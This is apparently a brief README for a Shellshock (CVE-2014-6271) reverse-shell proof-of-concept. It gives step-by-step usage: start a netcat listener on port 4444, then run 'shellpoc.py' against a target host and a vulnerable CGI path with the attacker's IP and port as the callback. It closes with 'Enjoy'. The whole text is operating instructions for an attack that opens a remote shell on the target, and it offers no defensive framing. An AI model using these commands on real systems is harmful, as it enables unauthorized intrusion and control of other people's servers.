# CVE-2014-6271
### python2.7

- Start listening on your machine.
```
nc -l -p 4444
```

- Run python script by the rule below: 
> python shellpoc.py \<host> \<vulnerable CGI> <attackhost/IP>
```
python shellpoc.py 10.10.10.101 /cgi-bin/status 10.10.10.1/4444
```

- Enjoy
